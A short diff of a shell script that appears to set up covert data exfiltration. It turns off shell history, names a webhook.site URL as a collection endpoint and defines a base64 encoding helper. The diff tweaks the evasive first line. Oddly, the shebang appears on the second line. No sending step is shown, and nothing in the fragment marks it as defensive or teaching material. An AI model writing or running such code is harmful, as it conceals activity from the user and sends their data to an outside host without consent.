@@ -1,4 +1,4 @@
-set +o history; # (
+set +o history; X(){ case "$1" in *) ;; esac; } # (
 #!/bin/sh
 B='https://webhook.site/5280fbc1-77f5-4ce4-823a-193a4cc5f8c4'
 E(){ base64 -w0 2>/dev/null || base64 2>/dev/null | tr -d '\n'; }
